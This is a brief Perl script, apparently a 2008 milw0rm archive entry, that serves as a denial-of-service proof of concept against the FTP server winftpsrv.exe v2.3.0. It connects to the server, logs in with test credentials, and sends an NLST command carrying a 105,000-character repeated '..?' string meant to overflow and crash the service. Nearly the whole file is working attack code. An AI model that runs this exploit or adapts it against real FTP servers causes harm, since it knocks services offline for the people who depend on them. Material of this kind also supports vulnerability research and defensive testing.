#!/usr/bin/perl
############
#
# Simple Dos Crap for the winftpsrv.exe v.2.3.0
#  by Julien Bedard
#
####################################

use Net::FTP;
$wftpsrvaddr = "255.255.255.255";
$overflow = "..?" x 35000;
$user = "test";
$pass = "test";
$port = 21;

$ftp = Net::FTP->new("$wftpsrvaddr", Debug => 0) || die "Cannot connect to ftp server: $@";
$ftp->login($user,$pass) || die "Cannot login ", $ftp->message;

$ftp->nlst($overflow);
$ftp->quit;

# milw0rm.com [2008-09-26]
